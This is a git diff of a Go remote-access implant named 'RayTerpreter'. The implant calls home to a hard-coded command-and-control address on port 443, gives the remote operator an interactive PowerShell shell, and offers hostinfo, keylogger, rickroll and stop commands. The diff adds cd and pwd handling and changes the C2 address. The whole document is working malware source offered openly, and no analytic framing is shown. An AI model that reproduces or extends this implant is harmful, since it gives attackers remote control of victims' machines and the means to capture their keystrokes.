@@ -5,10 +5,13 @@ import (
 	"net"
 	"os"
 	"os/exec"
+	"regexp"
 	"runtime"
+	"strings"
 	"time"
 
 	"github.com/D3Ext/maldev/process"
+
 	//"github.com/MarinX/keylogger"
 	"github.com/eiannone/keyboard"
 )
@@ -29,7 +32,7 @@ func callHome(c2Address *string, attempts *int) (net.Conn, bool) {
 	return addr, true
 }
 
-func listen4Commands(conn *net.Conn, implantWD *string) string {
+func listen4Commands(conn *net.Conn) string {
 	request := make([]byte, 128)
 	read_len, err := (*conn).Read(request)
 	if read_len == 0 {
@@ -42,11 +45,11 @@ func listen4Commands(conn *net.Conn, implantWD *string) string {
 	return command
 }
 
-func executeCommands(conn *net.Conn, command string) {
-	if command == "stop\n" {
+func executeCommands(conn *net.Conn, command *string) {
+	if *command == "stop\n" {
 		terminate()
 	}
-	cmd := exec.Command("powershell.exe", "/C", command)
+	cmd := exec.Command("powershell.exe", "/C", *command)
 	output, err := cmd.Output()
 	if err != nil {
 		fmt.Println("Couldn't Exec Command")
@@ -114,8 +117,24 @@ func listen4Commands2(conn *net.Conn, c1 chan string) {
 	c1 <- command
 }
 
+func cd(conn *net.Conn, command *string, pImplantWD *string) bool {
+	regexCD := regexp.MustCompile(`cd\s+.+`)
+	matchCD := regexCD.FindString(*command)
+	if matchCD != "" {
+		dir2go := strings.Split(matchCD, " ")[1]
+		// implantWD := os.Chdir(dir2go)
+		if os.Chdir(dir2go) != nil {
+			(*conn).Write([]byte("Error getting the dir\n"))
+		} else {
+			*pImplantWD, _ = os.Getwd()
+		}
+		return true
+	}
+	return false
+}
+
 func main() {
-	c2Address := "192.168.5.138:443"
+	c2Address := "192.168.0.102:443"
 	attempts := 0
 	implantWD, _ := os.Getwd()
 	fmt.Println("Implant Started")
@@ -123,19 +142,24 @@ func main() {
 	for !result {
 		conn, result = callHome(&c2Address, &attempts)
 	}
-	for {
+	for { //Main Program Loop
 		conn.Write([]byte("RayTerpreter $ "))
-		command := listen4Commands(&conn, &implantWD)
+		command := listen4Commands(&conn)
+
+		if cd(&conn, &command, &implantWD) {
+			continue
+		}
+
 		switch command {
 		case "shell\n":
 			{
 				for {
 					conn.Write([]byte("PS > "))
-					command = listen4Commands(&conn, &implantWD)
+					command = listen4Commands(&conn)
 					if command == "bg\n" {
 						break
 					}
-					executeCommands(&conn, command)
+					executeCommands(&conn, &command)
 				}
 			}
 		case "hostinfo\n":
@@ -177,10 +201,12 @@ func main() {
 				cmd := exec.Command("cmd", "/C", "start", "https://www.youtube.com/watch?v=dQw4w9WgXcQ")
 				cmd.Run()
 			}
+		case "pwd\n":
+			conn.Write([]byte("\n" + implantWD + "\n\n"))
 		case "stop\n":
 			terminate()
 		default:
-			conn.Write([]byte("Available Commands: shell, hostinfo, logger, rickroll, stop\n"))
+			conn.Write([]byte("Available Commands: cd, hostinfo, logger, pwd, rickroll, shell, stop\n"))
 		}
 	}
 	//time.Sleep(10 * time.Second)
